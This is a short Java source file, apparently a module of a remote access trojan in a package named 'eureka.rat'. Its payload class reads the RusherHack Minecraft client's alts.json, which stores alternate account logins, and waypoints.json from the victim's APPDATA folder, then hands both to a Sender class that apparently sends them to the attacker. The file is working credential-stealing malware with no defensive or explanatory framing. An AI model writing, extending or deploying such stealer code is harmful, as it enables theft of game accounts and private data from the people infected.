package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.util.Optional;

public class RusherHack implements Payload {
    @Override
    public void execute() throws Exception {
        Optional<File> accounts = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "rusherhack\\alts.json");
        accounts.ifPresent(Sender::send);

        Optional<File> waypoints = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "rusherhack\\waypoints.json");
        waypoints.ifPresent(Sender::send);
    }
}
